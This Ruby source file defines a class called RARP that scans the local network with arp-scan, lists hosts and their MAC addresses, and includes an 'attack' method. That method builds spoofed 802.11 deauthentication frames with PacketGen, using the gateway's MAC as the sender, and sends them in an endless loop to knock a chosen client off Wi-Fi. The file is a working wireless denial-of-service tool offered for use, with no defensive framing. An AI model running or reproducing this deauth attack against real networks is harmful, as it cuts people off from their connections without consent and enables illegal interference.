require "arp_scan"
require "tty-progressbar"
require "packetgen"

require_relative "utils"
require_relative "logger"

class RARP
	def self.get_mac(ip)
		mac = ARPScan(ip).hosts.first.mac
	end

	attr_reader :ips
	attr_reader :arp_hosts
	attr_reader :macs

	def initialize
		@scanned = false
		@report = nil
		@gateway = nil
		@arp_hosts = Array.new
		@ips = Array.new
		@macs = Array.new
	end

	def scan
		bar = TTY::ProgressBar.new("Scanning... [:bar]", bar_format: :box, total: 100, clear: true)
		@report = ARPScan("--localnet");
		100.times {
			bar.advance
			sleep(0.007)
		}

		@scanned = true
		@arp_hosts = @report.hosts
		@gateway = @arp_hosts.first.mac
		@ips = @arp_hosts.map { |h| h.ip_addr }
		@ips.uniq!
		@ips.sort_by! {|ip| ip.split('.').map{|octet| octet.to_i}}
		@macs = @arp_hosts.map { |h| h.mac }
		info("Successfully scanned!")
		return @arp_hosts.uniq!
	end

	def ipinfo(ip)
		begin
			report = ARPScan(ip)
			info = report.hosts.first
			[info.ip_addr, info.mac, info.oui]
		rescue
			error("Please make sure it's a valid IP!")
			return
		end
	end

	def help
		info("Current commands:")
		Utils::CMDS.each do |cmd|
			puts "\t- #{cmd}"
		end
	end

	def hosts
		unless @scanned
			warning("Please run 'scan' to scan your network")
			return
		end

		@ips.each do |ip|
			info(ip)
		end
	end

	def attack(host)
		begin
			stop = Proc.new { print "\e[1A\e[K"; info("Stopping..."); return }
			pkt = PacketGen.gen("RadioTap").
			add("Dot11::Management", mac1: host, mac2: @gateway, mac3: @gateway).
			add("Dot11::DeAuth", reason: 7)

			info("Gateway: #{@gateway}")
			info("Client: #{host}")

			bar = TTY::ProgressBar.new("Attacking... [:bar]", clear: true, bar_format: :box)
			begin
				loop do |sent|
					bar.advance
					pkt.to_w
				end
			ensure

				bar.finish
				stop.call
			end

		rescue
			warning("An error occurred")
			return
		end
	end

	def config
		unless @scanned
			warning("Please run 'scan' to scan your network")
			return
		end

		info("Range: #{@report.range_size}")
		info("Alive: #{@report.reply_count}")
		info("Last scan time: #{@report.scan_time	}")
		info("Version: #{@report.version}")
	end
end